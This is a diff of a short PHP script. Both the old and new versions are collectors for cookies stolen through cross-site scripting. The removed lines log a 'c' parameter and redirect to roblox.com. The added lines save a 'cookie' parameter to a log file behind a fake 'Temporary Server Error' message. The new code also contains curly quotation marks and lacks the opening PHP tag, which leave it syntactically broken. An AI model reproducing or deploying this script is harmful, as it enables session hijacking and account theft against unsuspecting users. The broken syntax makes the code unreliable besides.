@@ -1,11 +1,23 @@
-<?php 
-$logFile = "banned.txt"; 
-$ban = $_REQUEST["c"];
-
-$handle = fopen($logFile, "a"); 
-fwrite($handle, $ban . "\n\n"); 
+$filename = “logfile.txt”;
+if (isset($_GET["cookie"]))
+{
+if (!$handle = fopen($filename, ‘a’))
+{
+echo “Temporary Server Error,Sorry for the inconvenience.”;
+exit;
+}
+else
+{
+if (fwrite($handle, “\r\n” . $_GET["cookie"]) === FALSE)
+{
+echo “Temporary Server Error,Sorry for the inconvenience.”;
+exit;
+}
+}
+echo “Temporary Server Error,Sorry for the inconvenience.”;
 fclose($handle);
-
-header("Location: http://roblox.com"); 
-exit; 
+exit;
+}
+echo “Temporary Server Error,Sorry for the inconvenience.”;
+exit;
 ?>
